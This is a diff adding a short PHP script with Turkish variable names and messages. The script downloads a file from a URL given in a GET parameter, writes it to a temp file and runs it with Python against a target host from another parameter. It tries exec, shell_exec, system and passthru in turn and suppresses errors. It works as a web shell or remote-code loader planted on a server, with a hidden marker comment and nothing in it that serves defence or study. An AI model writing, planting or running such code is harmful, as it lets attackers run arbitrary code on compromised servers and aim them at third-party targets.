@@ -1,0 +1,18 @@
+<?php
+@set_time_limit(30);
+echo "<!--rahatinizabakin-->";
+$site = @$_GET["hedef"];
+$temp = tmpfile();
+$dosya = @file_get_contents(@$_GET["dosya"]);
+fwrite($temp, $dosya);
+$bilgi = stream_get_meta_data($temp);
+$dizin = $bilgi['uri'];
+$komut = "python {$dizin} {$site}";
+if(function_exists('exec')){$sonuc = @exec($komut);}elseif(function_exists('shell_exec')){$sonuc = @shell_exec($komut);}elseif(function_exists('system')){$sonuc = @system($komut);}elseif(function_exists('passthru')){$sonuc = @passthru($komut);
+}else{
+echo "tum fonksiyonlar kapali aq";
+}
+print $sonuc;
+fclose($temp);
+
+?>
